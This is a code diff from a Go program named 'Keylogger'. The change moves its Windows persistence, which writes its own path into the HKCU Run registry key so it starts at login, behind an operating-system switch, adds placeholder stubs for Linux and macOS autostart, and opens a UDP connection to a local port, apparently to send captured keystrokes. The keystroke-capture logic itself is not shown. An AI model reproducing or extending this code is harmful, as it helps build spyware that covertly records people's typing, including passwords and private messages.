@@ -12,22 +12,35 @@ import (
 	"golang.org/x/sys/windows/registry"
 	"net"
 	"os"
+	"runtime"
 )
 
 const (
-	Protocol = "udp"
-	Address  = "127.0.0.1:8722"
-	KeyName  = `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
-	AppName  = "Keylogger"
+	Protocol  = "udp"
+	Address   = "127.0.0.1:8722"
+	KeyName   = `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
+	AppName   = "Keylogger"
+	OSWindows = "windows"
+	OSLinux   = "linux"
+	OSDarwin  = "darwin"
 )
 
 func main() {
-	filename := os.Args[0]
-	key, _ := registry.OpenKey(registry.CURRENT_USER, KeyName, registry.ALL_ACCESS)
-	defer key.Close()
-	path, _, _ := key.GetStringValue(AppName)
-	if path != filename {
-		_ = key.SetStringValue(AppName, filename)
+	switch runtime.GOOS {
+	case OSWindows:
+		filename := os.Args[0]
+		key, _ := registry.OpenKey(registry.CURRENT_USER, KeyName, registry.ALL_ACCESS)
+		defer key.Close()
+		path, _, _ := key.GetStringValue(AppName)
+		if path != filename {
+			_ = key.SetStringValue(AppName, filename)
+		}
+	case OSLinux:
+		// TODO: Register autostart on Linux
+	case OSDarwin:
+		// TODO: Register autostart on Mac OS
+	default:
+		// Does not support other platforms
 	}
 
 	conn, err := net.Dial(Protocol, Address)
